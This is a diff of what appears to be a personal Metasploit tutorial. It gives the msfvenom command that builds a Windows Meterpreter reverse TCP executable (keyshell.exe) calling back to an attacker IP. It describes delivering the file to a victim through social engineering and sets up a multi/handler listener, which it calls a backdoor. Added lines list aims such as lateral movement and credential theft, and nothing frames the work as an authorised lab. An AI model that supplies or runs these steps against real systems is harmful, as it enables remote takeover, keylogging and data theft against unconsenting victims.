@@ -4,28 +4,38 @@ PART 1
 1.Log in to kali linux software
 2.The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework (see- https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
 
-    ## Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code ##
+#Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code
+#Using Meterpreter to generate an executable called keyshell.exe as illustrated before
 
-Using Meterpreter to generate an executable called keylogger.exe as illustrated before
+Metasploit is handy for generating a reverse shell. The following command generates a reverse TCP shell with the Metasploit framework:
 
 ┌──(kali㉿kali)-[~]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=444 -f exe -o keyshell.exe
 
-    # p - payload (windows/x64/meterpreter/reverse_tcp) 
-    # windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has to offer
-    # It allows you to remotely control the file system, sniff, keylog, hashdump, perform network pivoting, control the webcam and microphone
-    #LHOST - Listen Address (Threat actor IP address)
-    #LPORT - Listen port (The default is 444, It is advisable to change to another value)
-    #f - To outpute the executable file in exe (Window extension)
-    #o - To outpute the executable file name to keyshell.exe
+  #p - payload (windows/x64/meterpreter/reverse_tcp) 
+  #windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has to offer
+  #It allows you to remotely control the file system, sniff, keylog, hashdump, perform network pivoting, control the webcam and microphone
+  #LHOST - Listen Address (Threat actor IP address)
+  #LPORT - Listen port (The default is 444, It is advisable to change to another value)
+  #f - To outpute the executable file in exe (Window extension)
+  #o - To outpute the executable file name to keyshell.exe
 
 PART 2
-3. As seen above, the execuitebale file (keyshell.exe) has been created,.exe need to be transported to victim system/infrastructure
-   # It can be transported to the victim system via Social engineering or more sophisticated ways
-   # See previous work or update from seyigate on SET (Social Engineer Toolkits Framework)
+3. As seen above, the execuitebale file (keyshell.exe) has been created, exe need to be transported to victim system/infrastructure
+   #It can be transported to the victim system via Social engineering or more sophisticated ways
+   #See previous work or update from seyigate repro! on SET (Social Engineer Toolkits Framework)
 
 PART 3
-4. Create a listener which aslso known as backdoor 
+4. As assume that the hacker had already compromised the victim machine through the payload generated using Metasploit framework as explained above. 
+   #Now, hacker can gain more foothold on the machine, launch additional remote and payloads attacks
+   #Execute malicious code remotely 
+   #Move laterally through the whole system and network infrastructure.
+   #Data theft such as admin and elevated account credentials theft, financial loss, reputational damage, and legal penalties
+
+
+
+
+Create a listener which aslso known as backdoor 
 4. Create a listener
    kali> msfconsole
    kali> use exploit/multi/handler
